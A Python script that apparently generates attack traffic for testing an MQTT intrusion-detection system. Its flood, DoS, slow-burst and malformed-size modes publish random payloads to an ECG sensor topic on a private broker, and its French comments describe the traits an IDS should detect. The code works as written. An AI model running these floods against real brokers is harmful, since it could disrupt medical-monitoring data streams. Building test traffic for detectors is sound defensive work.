

import sys
import time
import base64
import os
import secrets
import paho.mqtt.client as mqtt

# ═══════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════

BROKER_HOST = "10.43.209.150"  
BROKER_PORT = 1883
TOPIC = "iot/sensor/ecg/raw"

# ═══════════════════════════════════════════════════════════
# GÉNÉRATEUR DE PAYLOADS FAUX
# ═══════════════════════════════════════════════════════════

def generate_fake_payload(size=100):
    """Génère un payload aléatoire en Base64 (simule du chiffré)"""
    random_bytes = secrets.token_bytes(size)
    return base64.b64encode(random_bytes).decode('utf-8')

# ═══════════════════════════════════════════════════════════
# ATTAQUES
# ═══════════════════════════════════════════════════════════

def attack_flood(client, duration=10):
    """
    FLOOD : Envoi massif de messages (50/sec pendant 10 sec)
    
    Caractéristiques détectables :
    - msg_per_sec très élevé (>10)
    - burst_ratio = 1.0
    - interval_std très bas
    """
    print(f"\n [FLOOD] Attaque démarrée pour {duration}s...")
    print(f"   Cible: {TOPIC}")
    print(f"   Débit: ~50 msg/sec\n")
    
    start = time.time()
    count = 0
    
    while time.time() - start < duration:
        payload = generate_fake_payload(100)
        client.publish(TOPIC, payload)
        count += 1
        time.sleep(0.02)  # 20ms = 50 msg/sec
        
        if count % 10 == 0:
            print(f"   [FLOOD] {count} messages envoyés")
    
    print(f"\nFLOOD terminé : {count} messages en {duration}s")
    print(f"   Vérifiez votre IDS pour voir [BLOCK] FLOOD\n")

def attack_dos(client, duration=10):
    """
    DOS : Saturation avec messages très rapides
    
    Caractéristiques détectables :
    - msg_per_sec extrême (>100)
    - burst_ratio = 1.0
    """
    print(f"\n [DOS] Attaque démarrée pour {duration}s...")
    print(f"   Cible: {TOPIC}")
    print(f"   Débit: ~200 msg/sec\n")
    
    start = time.time()
    count = 0
    
    while time.time() - start < duration:
        payload = generate_fake_payload(150)
        client.publish(TOPIC, payload)
        count += 1
        time.sleep(0.005)  
        
        if count % 50 == 0:
            print(f"   [DOS] {count} messages envoyés")
    
    print(f"\n DOS terminé : {count} messages en {duration}s\n")

def attack_slowite(client, duration=10):
    """
    SLOWITE : Connexions/déconnexions répétées
    
    Caractéristiques détectables :
    - intervals très irréguliers
    - interval_std élevé
    """
    print(f"\n [SLOWITE] Attaque démarrée pour {duration}s...")
    print(f"   Pattern: connexions lentes répétées\n")
    
    start = time.time()
    count = 0
    
    while time.time() - start < duration:
        # Pattern lent puis burst
        payload = generate_fake_payload(80)
        client.publish(TOPIC, payload)
        count += 1
        
    
        if count % 3 == 0:
            time.sleep(2.0) 
        else:
            time.sleep(0.05)  
        
        print(f"   [SLOWITE] Message #{count}")
    
    print(f"\nSLOWITE terminé : {count} messages\n")

def attack_malformed(client, duration=10):
    """
    MALFORMED : Paquets de tailles anormales
    """
    print(f"\n [MALFORMED] Attaque démarrée pour {duration}s...")
    print(f"   Pattern: tailles anormales\n")
    
    start = time.time()
    count = 0
    
    while time.time() - start < duration:
    
        size = 10 if count % 2 == 0 else 5000
        payload = generate_fake_payload(size)
        client.publish(TOPIC, payload)
        count += 1
        time.sleep(0.5)
        
        print(f"   [MALFORMED] Message #{count} (size={size})")
    
    print(f"\n MALFORMED terminé : {count} messages\n")


# MAIN


def main():
    if len(sys.argv) != 2:
        print("=" * 60)
        print("  SIMULATEUR D'ATTAQUES MQTT")
        print("=" * 60)
        print("\nUSAGE :")
        print("  python3 attack_simulator.py flood       # Attaque FLOOD")
        print("  python3 attack_simulator.py dos         # Attaque DOS")
        print("  python3 attack_simulator.py slowite     # Attaque SLOWITE")
        print("  python3 attack_simulator.py malformed   # Attaque MALFORMED")
        print()
        sys.exit(1)
    
    attack_type = sys.argv[1].lower()
    
    print("=" * 60)
    print("  SIMULATEUR D'ATTAQUES MQTT")
    print("=" * 60)
    print(f"  Broker : {BROKER_HOST}:{BROKER_PORT}")
    print(f"  Topic  : {TOPIC}")
    print(f"  Attack : {attack_type.upper()}")
    print("=" * 60)
    
    # Connexion MQTT
    try:
        from paho.mqtt.client import CallbackAPIVersion
        client = mqtt.Client(CallbackAPIVersion.VERSION2, client_id="ATTACKER")
    except ImportError:
        client = mqtt.Client(client_id="ATTACKER")
    
    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()
        time.sleep(1)
        
        # Lancer l'attaque
        if attack_type == "flood":
            attack_flood(client, duration=10)
        elif attack_type == "dos":
            attack_dos(client, duration=10)
        elif attack_type == "slowite":
            attack_slowite(client, duration=15)
        elif attack_type == "malformed":
            attack_malformed(client, duration=10)
        else:
            print(f" Attaque inconnue : {attack_type}")
            print("   Choix : flood, dos, slowite, malformed")
            sys.exit(1)
        
        client.loop_stop()
        client.disconnect()
        
        print("=" * 60)
        print("  ATTAQUE TERMINÉE")
        print("=" * 60)
        print("  Vérifiez votre IDS pour voir les détections")
        print("  Le subscriber ne devrait PAS recevoir ces messages")
        print("=" * 60)
    
    except KeyboardInterrupt:
        print("\n[INFO] Arrêt manuel")
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        print(f"\n Erreur : {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
